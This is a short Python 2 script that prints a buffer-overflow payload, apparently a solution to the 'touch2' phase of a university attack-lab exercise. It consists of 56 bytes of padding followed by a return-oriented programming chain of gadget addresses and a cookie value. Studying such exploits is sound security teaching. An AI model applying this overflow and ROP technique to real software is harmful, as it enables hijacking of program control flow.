cookie = "\x03\xd8\x7d\x1a" + "\x00"*4
popeax = "\x3b\x1b\x40\x00" + "\x00"*4
movraxrdi = "\x1b\x1b\x40\x00" + "\x00"*4
touch2 = "\x63\x19\x40\x00" + "\x00"*4
shell = popeax + cookie + movraxrdi + touch2
shell = "A"*56 + shell
print shell
